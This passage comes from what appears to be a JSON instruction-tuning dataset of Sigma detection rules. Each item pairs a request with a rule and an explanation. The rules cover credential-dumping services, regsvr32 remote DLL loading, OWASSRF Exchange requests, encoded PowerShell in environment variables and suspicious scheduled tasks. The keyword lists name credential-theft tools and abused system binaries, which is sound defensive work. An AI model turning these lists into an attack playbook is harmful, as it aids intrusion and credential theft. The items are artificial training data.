      "answer": "In order to detect suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options, and other low-level stuff, you should monitor Windows process creation logs for instances where processes match specific patterns indicating the use of PCHunter. Look for processes that have been created with the image names ending in '\\PCHunter64.exe' or '\\PCHunter32.exe'. Additionally, pay attention to processes that contain certain properties, such as files named 'PCHunter.exe' or those described as 'Epoolsoft Windows Information View Tools'. Moreover, it is critical to scrutinize processes with specific hash values, which include a variety of SHA1, MD5, SHA256, and IMPHASH identifiers such as '5F1CBC3D99558307BC1250D084FA968521482025', '987B65CD9B9F4E9A1AFD8F8B48CF64A7', '2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32', among others listed. These characteristics strongly indicate the execution or manipulation of processes using the PCHunter tool, which can be an essential part of diagnosing or intervening in potentially malicious activity aimed at manipulating system processes or obtaining sensitive information at a low level. It is important to note that false positives are unlikely, indicating that detection of these specific patterns should be treated with high priority and investigated accordingly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PsExec service installation and execution events (service and Sysmon).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PsExec service installation and execution events (service and Sysmon), you should monitor Windows System logs for specific activity related to the Service Control Manager. Specifically, look for events with the Provider_Name 'Service Control Manager' and EventIDs 7045 and 7036. These event IDs are crucial as they signal the creation of a service and changes in the service's status respectively. Additionally, pay close attention to service names and image paths that contain the following identifiers: 'WCESERVICE', 'WCE SERVICE', 'winexesvc', 'DumpSvc', 'pwdump', 'gsecdump', and 'cachedump'. These names are associated with tools and methods commonly used in attacks for dumping credentials. Moreover, any service image path containing the word 'bypass' should also raise suspicions as it might indicate attempts to circumvent security controls, based on known techniques. This monitoring activity aligns with the identification of tactics and techniques such as Execution through API, Service Execution, and Credential Dumping which are indicative of adversarial behaviors aiming to gain further foothold within the environment. Be aware that due to the nature of these identifiers and actions, false positives may occur, and should be considered when analyzing alerts with a high level of scrutiny.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    service:\n        Provider_Name: 'Service Control Manager'\n        EventID:\n            - 7045\n            - 7036\n    selection:\n        - ServiceName|contains:\n            - 'WCESERVICE'\n            - 'WCE SERVICE'\n            - 'winexesvc'\n            - 'DumpSvc'\n            - 'pwdump'\n            - 'gsecdump'\n            - 'cachedump'\n        - ImagePath|contains: 'bypass' # https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82#file-scmuacbypass-cpp-L159\n    condition: service and selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    service:\n        Provider_Name: 'Service Control Manager'\n        EventID:\n            - 7045\n            - 7036\n    selection:\n        - ServiceName|contains:\n            - 'WCESERVICE'\n            - 'WCE SERVICE'\n            - 'winexesvc'\n            - 'DumpSvc'\n            - 'pwdump'\n            - 'gsecdump'\n            - 'cachedump'\n        - ImagePath|contains: 'bypass' # https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82#file-scmuacbypass-cpp-L159\n    condition: service and selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "PsExec service installation and execution events (service and Sysmon)",
      "answer": "In order to detect PsExec service installation and execution events (service and Sysmon), you should monitor Windows System logs for specific activity related to the Service Control Manager. Specifically, look for events with the Provider_Name 'Service Control Manager' and EventIDs 7045 and 7036. These event IDs are crucial as they signal the creation of a service and changes in the service's status respectively. Additionally, pay close attention to service names and image paths that contain the following identifiers: 'WCESERVICE', 'WCE SERVICE', 'winexesvc', 'DumpSvc', 'pwdump', 'gsecdump', and 'cachedump'. These names are associated with tools and methods commonly used in attacks for dumping credentials. Moreover, any service image path containing the word 'bypass' should also raise suspicions as it might indicate attempts to circumvent security controls, based on known techniques. This monitoring activity aligns with the identification of tactics and techniques such as Execution through API, Service Execution, and Credential Dumping which are indicative of adversarial behaviors aiming to gain further foothold within the environment. Be aware that due to the nature of these identifiers and actions, false positives may occur, and should be considered when analyzing alerts with a high level of scrutiny."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting embeding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect embedding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information, you should: Monitor Linux systems for the use of the 'steghide' binary, specifically focusing on the auditd logs. Be on the lookout for the execution of 'steghide' with the arguments 'embed', '-cf', and '-ef'. These arguments indicate an attempt to embed hidden information within files. The 'execve' type in the logs is crucial, as it signifies an execution request for the steghide command. The '-cf' option specifies the cover file that will contain the hidden data, while '-ef' denotes the embedded file that carries the data to be hidden. It's important to understand that, despite the low level of initial suspicion attributed to these actions (as they could theoretically be used in benign scenarios), their detection plays a critical role in uncovering efforts by adversaries to transfer or conceal sensitive information.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: EXECVE\n        a0: steghide\n        a1: embed\n        a2:\n            - '-cf'\n            - '-ef'\n        a4:\n            - '-cf'\n            - '-ef'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: EXECVE\n        a0: steghide\n        a1: embed\n        a2:\n            - '-cf'\n            - '-ef'\n        a4:\n            - '-cf'\n            - '-ef'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "embeding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.",
      "answer": "In order to detect embedding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information, you should: Monitor Linux systems for the use of the 'steghide' binary, specifically focusing on the auditd logs. Be on the lookout for the execution of 'steghide' with the arguments 'embed', '-cf', and '-ef'. These arguments indicate an attempt to embed hidden information within files. The 'execve' type in the logs is crucial, as it signifies an execution request for the steghide command. The '-cf' option specifies the cover file that will contain the hidden data, while '-ef' denotes the embedded file that carries the data to be hidden. It's important to understand that, despite the low level of initial suspicion attributed to these actions (as they could theoretically be used in benign scenarios), their detection plays a critical role in uncovering efforts by adversaries to transfer or conceal sensitive information."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempt of the OWASSRF variant targeting exchange servers It uses the OWA endpoint to access the powershell backend endpoint.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts of the OWASSRF variant targeting exchange servers which uses the OWA endpoint to access the PowerShell backend endpoint, you should monitor the proxy logs for specific patterns of web requests. Specifically, look for POST requests with a 200 status code, indicating a successful interaction, where the requested URI contains both '/owa/' and '/powershell'. Additionally, these requests might also contain '@' or its URL encoded equivalent '%40'. However, it's important to exclude any requests that have user-agent strings associated with 'ClientInfo', 'Microsoft WinRM Client', or 'Exchange BackEnd Probes', as these are generally legitimate inquiries and not indicative of the OWASSRF attack. These exclusions help reduce false positives, which might arise from activities such as web vulnerability scans. Given the critical nature of this attack method, any detection of such patterns should be treated with a high level of concern and investigated promptly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'POST'\n        sc-status: 200\n        c-uri|contains|all:\n            - '/owa/'\n            - '/powershell'\n        c-uri|contains:\n            - '@'\n            - '%40'\n    filter:\n        c-useragent:\n            - 'ClientInfo'\n            - 'Microsoft WinRM Client'\n            - 'Exchange BackEnd Probes'\n    condition: selection and not filter\nfalsepositives:\n    - Web vulnerability scanners\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'POST'\n        sc-status: 200\n        c-uri|contains|all:\n            - '/owa/'\n            - '/powershell'\n        c-uri|contains:\n            - '@'\n            - '%40'\n    filter:\n        c-useragent:\n            - 'ClientInfo'\n            - 'Microsoft WinRM Client'\n            - 'Exchange BackEnd Probes'\n    condition: selection and not filter\nfalsepositives:\n    - Web vulnerability scanners\nlevel: high\n",
      "question": "exploitation attempt of the OWASSRF variant targeting exchange servers It uses the OWA endpoint to access the powershell backend endpoint",
      "answer": "In order to detect exploitation attempts of the OWASSRF variant targeting exchange servers which uses the OWA endpoint to access the PowerShell backend endpoint, you should monitor the proxy logs for specific patterns of web requests. Specifically, look for POST requests with a 200 status code, indicating a successful interaction, where the requested URI contains both '/owa/' and '/powershell'. Additionally, these requests might also contain '@' or its URL encoded equivalent '%40'. However, it's important to exclude any requests that have user-agent strings associated with 'ClientInfo', 'Microsoft WinRM Client', or 'Exchange BackEnd Probes', as these are generally legitimate inquiries and not indicative of the OWASSRF attack. These exclusions help reduce false positives, which might arise from activities such as web vulnerability scans. Given the critical nature of this attack method, any detection of such patterns should be treated with a high level of concern and investigated promptly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an application exports a certificate (and potentially the private key as well) from the local Windows certificate store..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an application exports a certificate (and potentially the private key as well) from the local Windows certificate store, you should: Monitor the Windows Certificate Services Client Lifecycle logs, specifically focusing on Event ID 1007, which indicates that a certificate has been exported. Be aware that legitimate applications may also request certificate exports, so you might need to apply additional filters to distinguish between benign and potentially malicious activity. This monitoring is considered to have a medium level of importance in identifying potential security incidents related to certificate exportation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: certificateservicesclient-lifecycle-system\ndetection:\n    selection:\n        EventID: 1007 # A certificate has been exported\n    condition: selection\nfalsepositives:\n    - Legitimate application requesting certificate exports will trigger this. Apply additional filters as needed\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: certificateservicesclient-lifecycle-system\ndetection:\n    selection:\n        EventID: 1007 # A certificate has been exported\n    condition: selection\nfalsepositives:\n    - Legitimate application requesting certificate exports will trigger this. Apply additional filters as needed\nlevel: medium\n",
      "question": "when an application exports a certificate (and potentially the private key as well) from the local Windows certificate store.",
      "answer": "In order to detect when an application exports a certificate (and potentially the private key as well) from the local Windows certificate store, you should: Monitor the Windows Certificate Services Client Lifecycle logs, specifically focusing on Event ID 1007, which indicates that a certificate has been exported. Be aware that legitimate applications may also request certificate exports, so you might need to apply additional filters to distinguish between benign and potentially malicious activity. This monitoring is considered to have a medium level of importance in identifying potential security incidents related to certificate exportation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting regsvr32 execution to download and install DLLs located remotely where the address is an IP address..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect regsvr32 execution to download and install DLLs located remotely where the address is an IP address, you should monitor for process creations on Windows systems, especially focused on the execution of regsvr32.exe. This involves checking if the process image name ends with '\\regsvr32.exe' or the original file is named 'REGSVR32.EXE'. Additionally, pay attention to command-line executions that attempt to invoke regsvr32 with the '/i:' or '-i:' options followed by 'http://' or 'https://' URLs that start directly with digits (indicating direct IP address usage rather than domain names) from '1' to '9'. This detection strategy is critical since attackers might use regsvr32, a legitimate Windows utility, to download remote DLLs for malicious purposes, leveraging the fact that IP addresses starting with numbers could be used to bypass less sophisticated security measures. Be mindful of potential false positives which could arise from legitimate applications named similarly or using IP addresses in their normal operations, such as \"7-Zip\". This approach corresponds to a high alert level due to the serious implications of allowing unauthorized DLL downloads and executions via regsvr32.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_ip:\n        CommandLine|contains:\n            - ' /i:http://1'\n            - ' /i:http://2'\n            - ' /i:http://3'\n            - ' /i:http://4'\n            - ' /i:http://5'\n            - ' /i:http://6'\n            - ' /i:http://7'\n            - ' /i:http://8'\n            - ' /i:http://9'\n            - ' /i:https://1'\n            - ' /i:https://2'\n            - ' /i:https://3'\n            - ' /i:https://4'\n            - ' /i:https://5'\n            - ' /i:https://6'\n            - ' /i:https://7'\n            - ' /i:https://8'\n            - ' /i:https://9'\n            - ' -i:http://1'\n            - ' -i:http://2'\n            - ' -i:http://3'\n            - ' -i:http://4'\n            - ' -i:http://5'\n            - ' -i:http://6'\n            - ' -i:http://7'\n            - ' -i:http://8'\n            - ' -i:http://9'\n            - ' -i:https://1'\n            - ' -i:https://2'\n            - ' -i:https://3'\n            - ' -i:https://4'\n            - ' -i:https://5'\n            - ' -i:https://6'\n            - ' -i:https://7'\n            - ' -i:https://8'\n            - ' -i:https://9'\n    condition: all of selection_*\nfalsepositives:\n    - FQDNs that start with a number such as \"7-Zip\"\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_ip:\n        CommandLine|contains:\n            - ' /i:http://1'\n            - ' /i:http://2'\n            - ' /i:http://3'\n            - ' /i:http://4'\n            - ' /i:http://5'\n            - ' /i:http://6'\n            - ' /i:http://7'\n            - ' /i:http://8'\n            - ' /i:http://9'\n            - ' /i:https://1'\n            - ' /i:https://2'\n            - ' /i:https://3'\n            - ' /i:https://4'\n            - ' /i:https://5'\n            - ' /i:https://6'\n            - ' /i:https://7'\n            - ' /i:https://8'\n            - ' /i:https://9'\n            - ' -i:http://1'\n            - ' -i:http://2'\n            - ' -i:http://3'\n            - ' -i:http://4'\n            - ' -i:http://5'\n            - ' -i:http://6'\n            - ' -i:http://7'\n            - ' -i:http://8'\n            - ' -i:http://9'\n            - ' -i:https://1'\n            - ' -i:https://2'\n            - ' -i:https://3'\n            - ' -i:https://4'\n            - ' -i:https://5'\n            - ' -i:https://6'\n            - ' -i:https://7'\n            - ' -i:https://8'\n            - ' -i:https://9'\n    condition: all of selection_*\nfalsepositives:\n    - FQDNs that start with a number such as \"7-Zip\"\nlevel: high\n",
      "question": "regsvr32 execution to download and install DLLs located remotely where the address is an IP address.",
      "answer": "In order to detect regsvr32 execution to download and install DLLs located remotely where the address is an IP address, you should monitor for process creations on Windows systems, especially focused on the execution of regsvr32.exe. This involves checking if the process image name ends with '\\regsvr32.exe' or the original file is named 'REGSVR32.EXE'. Additionally, pay attention to command-line executions that attempt to invoke regsvr32 with the '/i:' or '-i:' options followed by 'http://' or 'https://' URLs that start directly with digits (indicating direct IP address usage rather than domain names) from '1' to '9'. This detection strategy is critical since attackers might use regsvr32, a legitimate Windows utility, to download remote DLLs for malicious purposes, leveraging the fact that IP addresses starting with numbers could be used to bypass less sophisticated security measures. Be mindful of potential false positives which could arise from legitimate applications named similarly or using IP addresses in their normal operations, such as \"7-Zip\". This approach corresponds to a high alert level due to the serious implications of allowing unauthorized DLL downloads and executions via regsvr32."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting update to a scheduled task event that contain suspicious keywords..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect updates to a scheduled task event that contain suspicious keywords, you should monitor security logs generated by the Windows operating system, specifically focusing on the security service logs. The detection relies on having the Advanced Audit Policy configured to audit Other Object Access Events. This configuration is essential for identifying potential security threats related to scheduled task modifications.\n\nLook for event ID 4702, which signifies updates made to scheduled tasks. The modification details in these events are critical for analysis. Pay special attention to tasks that have been updated to include paths commonly associated with temporary or commonly exploited directories, such as \"\\AppData\\Local\\Temp\\\", \"\\AppData\\Roaming\\\", \"\\Users\\Public\\\", \"\\WINDOWS\\Temp\\\", \"C:\\Temp\\\", \"\\Desktop\\\", \"\\Downloads\\\", \"\\Temporary Internet Files\\\", \"C:\\ProgramData\\\", and \"C:\\Perflogs\\\". These paths are often used by attackers to execute malicious scripts or programs without drawing attention.\n\nAdditionally, analyze the commands associated with the updated tasks. Suspicious commands include but are not limited to \"regsvr32\", \"rundll32\", \"cmd.exe\", \"powershell\", \"pwsh\", \"mshta\", \"wscript\", \"cscript\", \"certutil\", \"bitsadmin\", \"bash.exe\", \"scrcons\", \"wmic\", \"forfiles\", \"scriptrunner\", and \"hh.exe\". These commands are commonly utilized in various attack techniques to execute scripts, manipulate processes, or download and run malicious payloads.\n\nThe detection of such activities in scheduled task updates is associated with several tactics and techniques, including Execution, Persistence, Privilege Escalation, and Defense Evasion. Identifying these modifications and command executions in the specified paths can be indicative of malicious activities attempting to gain a foothold, maintain persistence, escalate privileges, or evade detection mechanisms within a network.\n\nIt's important to exercise caution and thoroughly investigate these detections, as there can be unknown false positives due to legitimate administrative tasks that may use similar methods for valid purposes. The level of threat associated with these findings is considered high, emphasizing the importance of prompt and detailed investigation to prevent potential security breaches or system compromise.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'The Advanced Audit Policy setting Object Access > Audit Other Object Access Events has to be configured to allow this detection. We also recommend extracting the Command field from the embedded XML in the event data.'\ndetection:\n    selection_eid:\n        EventID: 4702\n    selection_paths:\n        TaskContentNew|contains:\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n            - '\\Users\\Public\\'\n            - '\\WINDOWS\\Temp\\'\n            - 'C:\\Temp\\'\n            - '\\Desktop\\'\n            - '\\Downloads\\'\n            - '\\Temporary Internet'\n            - 'C:\\ProgramData\\'\n            - 'C:\\Perflogs\\'\n    selection_commands:\n        TaskContentNew|contains:\n            - 'regsvr32'\n            - 'rundll32'\n            - 'cmd.exe</Command>'\n            - 'cmd</Command>'\n            - '<Arguments>/c '\n            - '<Arguments>/k '\n            - '<Arguments>/r '\n            - 'powershell'\n            - 'pwsh'\n            - 'mshta'\n            - 'wscript'\n            - 'cscript'\n            - 'certutil'\n            - 'bitsadmin'\n            - 'bash.exe'\n            - 'bash '\n            - 'scrcons'\n            - 'wmic '\n            - 'wmic.exe'\n            - 'forfiles'\n            - 'scriptrunner'\n            - 'hh.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'The Advanced Audit Policy setting Object Access > Audit Other Object Access Events has to be configured to allow this detection. We also recommend extracting the Command field from the embedded XML in the event data.'\ndetection:\n    selection_eid:\n        EventID: 4702\n    selection_paths:\n        TaskContentNew|contains:\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n            - '\\Users\\Public\\'\n            - '\\WINDOWS\\Temp\\'\n            - 'C:\\Temp\\'\n            - '\\Desktop\\'\n            - '\\Downloads\\'\n            - '\\Temporary Internet'\n            - 'C:\\ProgramData\\'\n            - 'C:\\Perflogs\\'\n    selection_commands:\n        TaskContentNew|contains:\n            - 'regsvr32'\n            - 'rundll32'\n            - 'cmd.exe</Command>'\n            - 'cmd</Command>'\n            - '<Arguments>/c '\n            - '<Arguments>/k '\n            - '<Arguments>/r '\n            - 'powershell'\n            - 'pwsh'\n            - 'mshta'\n            - 'wscript'\n            - 'cscript'\n            - 'certutil'\n            - 'bitsadmin'\n            - 'bash.exe'\n            - 'bash '\n            - 'scrcons'\n            - 'wmic '\n            - 'wmic.exe'\n            - 'forfiles'\n            - 'scriptrunner'\n            - 'hh.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "update to a scheduled task event that contain suspicious keywords.",
      "answer": "In order to detect updates to a scheduled task event that contain suspicious keywords, you should monitor security logs generated by the Windows operating system, specifically focusing on the security service logs. The detection relies on having the Advanced Audit Policy configured to audit Other Object Access Events. This configuration is essential for identifying potential security threats related to scheduled task modifications.\n\nLook for event ID 4702, which signifies updates made to scheduled tasks. The modification details in these events are critical for analysis. Pay special attention to tasks that have been updated to include paths commonly associated with temporary or commonly exploited directories, such as \"\\AppData\\Local\\Temp\\\", \"\\AppData\\Roaming\\\", \"\\Users\\Public\\\", \"\\WINDOWS\\Temp\\\", \"C:\\Temp\\\", \"\\Desktop\\\", \"\\Downloads\\\", \"\\Temporary Internet Files\\\", \"C:\\ProgramData\\\", and \"C:\\Perflogs\\\". These paths are often used by attackers to execute malicious scripts or programs without drawing attention.\n\nAdditionally, analyze the commands associated with the updated tasks. Suspicious commands include but are not limited to \"regsvr32\", \"rundll32\", \"cmd.exe\", \"powershell\", \"pwsh\", \"mshta\", \"wscript\", \"cscript\", \"certutil\", \"bitsadmin\", \"bash.exe\", \"scrcons\", \"wmic\", \"forfiles\", \"scriptrunner\", and \"hh.exe\". These commands are commonly utilized in various attack techniques to execute scripts, manipulate processes, or download and run malicious payloads.\n\nThe detection of such activities in scheduled task updates is associated with several tactics and techniques, including Execution, Persistence, Privilege Escalation, and Defense Evasion. Identifying these modifications and command executions in the specified paths can be indicative of malicious activities attempting to gain a foothold, maintain persistence, escalate privileges, or evade detection mechanisms within a network.\n\nIt's important to exercise caution and thoroughly investigate these detections, as there can be unknown false positives due to legitimate administrative tasks that may use similar methods for valid purposes. The level of threat associated with these findings is considered high, emphasizing the importance of prompt and detailed investigation to prevent potential security breaches or system compromise."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of user-specific or system-wide environment variables via the registry. Which contains suspicious commands and strings.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of user-specific or system-wide environment variables via the registry, which contains suspicious commands and strings, you should: Focus on monitoring Windows registry settings, particularly looking at registry set events. Ensure attention to `SetValue` events where the target object is related to `\\Environment\\` paths. It's critical to inspect the details of these settings for evidence of malicious activity, including the presence of 'powershell' or 'pwsh' commands which could indicate an attempt to execute scripts or commands in a hidden manner.\n\nFurthermore, scrutinize the environment variable values for patterns or strings that are commonly associated with malware or exploit activities. This includes paths to temporary directories like `\\AppData\\Local\\Temp\\` and `C:\\Users\\Public\\`, which are often used by attackers to store malicious files. Be particularly vigilant for the presence of base64-encoded strings, especially those that represent the MZ header (indicating the start of executable files) or strings that begin with 'Invoke-', as these may signify encoded PowerShell commands designed to bypass security mechanisms.\n\nAdditionally, look for strings that start with certain patterns such as 'SUVY', 'SQBFAF', and others listed, as these can be indicative of attempts to execute encoded scripts, access specific environment variables in a hidden manner, or leverage common command-line utilities for malicious purposes. \n\nMonitoring for these specific registry set actions and scrutinizing the details for these suspicious indicators can significantly aid in identifying attempts to manipulate environment variables for malicious purposes. The tags associated with this activity encompass various tactics and techniques related to execution and defense evasion, highlighting the importance of these detections in uncovering potential attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection_main:\n        EventType: SetValue\n        TargetObject|contains: '\\Environment\\'\n    selection_details:\n        - Details:\n            - 'powershell'\n            - 'pwsh'\n        - Details|contains:\n            # Add more suspicious strings in env variables below\n            - '\\AppData\\Local\\Temp\\'\n            - 'C:\\Users\\Public\\'\n            # Base64 MZ Header\n            - 'TVqQAAMAAAAEAAAA' # MZ..........\n            - 'TVpQAAIAAAAEAA8A'\n            - 'TVqAAAEAAAAEABAA'\n            - 'TVoAAAAAAAAAAAAA'\n            - 'TVpTAQEAAAAEAAAA'\n            # Base64 Invoke- (UTF-8)\n            - 'SW52b2tlL'\n            - 'ludm9rZS'\n            - 'JbnZva2Ut'\n            # Base64 Invoke- (UTF-16LE)\n            - 'SQBuAHYAbwBrAGUALQ'\n            - 'kAbgB2AG8AawBlAC0A'\n            - 'JAG4AdgBvAGsAZQAtA'\n        - Details|startswith:  # https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639\n            - 'SUVY'\n            - 'SQBFAF'\n            - 'SQBuAH'\n            - 'cwBhA'\n            - 'aWV4'\n            - 'aQBlA'\n            - 'R2V0'\n            - 'dmFy'\n            - 'dgBhA'\n            - 'dXNpbm'\n            - 'H4sIA'\n            - 'Y21k'\n            - 'cABhAH'\n            - 'Qzpc'\n            - 'Yzpc'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection_main:\n        EventType: SetValue\n        TargetObject|contains: '\\Environment\\'\n    selection_details:\n        - Details:\n            - 'powershell'\n            - 'pwsh'\n        - Details|contains:\n            # Add more suspicious strings in env variables below\n            - '\\AppData\\Local\\Temp\\'\n            - 'C:\\Users\\Public\\'\n            # Base64 MZ Header\n            - 'TVqQAAMAAAAEAAAA' # MZ..........\n            - 'TVpQAAIAAAAEAA8A'\n            - 'TVqAAAEAAAAEABAA'\n            - 'TVoAAAAAAAAAAAAA'\n            - 'TVpTAQEAAAAEAAAA'\n            # Base64 Invoke- (UTF-8)\n            - 'SW52b2tlL'\n            - 'ludm9rZS'\n            - 'JbnZva2Ut'\n            # Base64 Invoke- (UTF-16LE)\n            - 'SQBuAHYAbwBrAGUALQ'\n            - 'kAbgB2AG8AawBlAC0A'\n            - 'JAG4AdgBvAGsAZQAtA'\n        - Details|startswith:  # https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639\n            - 'SUVY'\n            - 'SQBFAF'\n            - 'SQBuAH'\n            - 'cwBhA'\n            - 'aWV4'\n            - 'aQBlA'\n            - 'R2V0'\n            - 'dmFy'\n            - 'dgBhA'\n            - 'dXNpbm'\n            - 'H4sIA'\n            - 'Y21k'\n            - 'cABhAH'\n            - 'Qzpc'\n            - 'Yzpc'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "creation of user-specific or system-wide environment variables via the registry. Which contains suspicious commands and strings",
      "answer": "In order to detect the creation of user-specific or system-wide environment variables via the registry, which contains suspicious commands and strings, you should: Focus on monitoring Windows registry settings, particularly looking at registry set events. Ensure attention to `SetValue` events where the target object is related to `\\Environment\\` paths. It's critical to inspect the details of these settings for evidence of malicious activity, including the presence of 'powershell' or 'pwsh' commands which could indicate an attempt to execute scripts or commands in a hidden manner.\n\nFurthermore, scrutinize the environment variable values for patterns or strings that are commonly associated with malware or exploit activities. This includes paths to temporary directories like `\\AppData\\Local\\Temp\\` and `C:\\Users\\Public\\`, which are often used by attackers to store malicious files. Be particularly vigilant for the presence of base64-encoded strings, especially those that represent the MZ header (indicating the start of executable files) or strings that begin with 'Invoke-', as these may signify encoded PowerShell commands designed to bypass security mechanisms.\n\nAdditionally, look for strings that start with certain patterns such as 'SUVY', 'SQBFAF', and others listed, as these can be indicative of attempts to execute encoded scripts, access specific environment variables in a hidden manner, or leverage common command-line utilities for malicious purposes. \n\nMonitoring for these specific registry set actions and scrutinizing the details for these suspicious indicators can significantly aid in identifying attempts to manipulate environment variables for malicious purposes. The tags associated with this activity encompass various tactics and techniques related to execution and defense evasion, highlighting the importance of these detections in uncovering potential attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting download of suspicious file type from URLs with IP.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the download of suspicious file types from URLs with IP, you should focus on monitoring Windows event logs, specifically those related to the creation of stream hashes. These events can indicate when files are downloaded or modified, potentially signaling a cybersecurity threat.\n\nYour detection strategy should involve inspecting any event where the content of the file or the action taken includes references to HTTP or HTTPS URLs that are formatted with direct IP addresses, which is a common method attackers use to try and evade detection by not using human-readable domain names. It's crucial to particularly look out for file types that are commonly abused in attacks due to their capability to execute code. These file types include PowerShell scripts (.ps1), batch files (.bat), executable files (.exe), VBScript scripts (.vbs and .vbe), Dynamic Link Library files (.dll), OneNote files (.one), command prompt scripts (.cmd), HTML applications (.hta), Excel add-ins (.xll), and shortcut files (.lnk). The presence of ':Zone' in the TargetFilename field alongside these file extensions signals that these files have been marked with a security zone identifier, typically indicating they've been downloaded from the Internet, which can further corroborate the suspicion of a malicious download.\n\nGiven the level of threat is considered high, any detection matching these criteria should be investigated promptly to determine if it is a legitimate activity or an indication of an attempted or successful malicious action. It's important to note that while these detections are strongly indicative of suspicious activity, false positives are possible, albeit their sources are not well-defined. Thus, while responding to these alerts, one must apply a degree of scrutiny to effectively differentiate between benign and malevolent activities. Monitoring for such behaviors is aligned with tactics and techniques observed in real-world attacks, such as Execution, Persistence, Defense Evasion, and Command and Control, by notably focusing on the execution and use of scripts and executables that may be utilized by attackers to achieve their objectives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: create_stream_hash\ndetection:\n    selection:\n        Contents|re: 'http[s]?://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'\n        TargetFilename|contains:\n            - '.ps1:Zone'\n            - '.bat:Zone'\n            - '.exe:Zone'\n            - '.vbe:Zone'\n            - '.vbs:Zone'\n            - '.dll:Zone'\n            - '.one:Zone'\n            - '.cmd:Zone'\n            - '.hta:Zone'\n            - '.xll:Zone'\n            - '.lnk:Zone'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
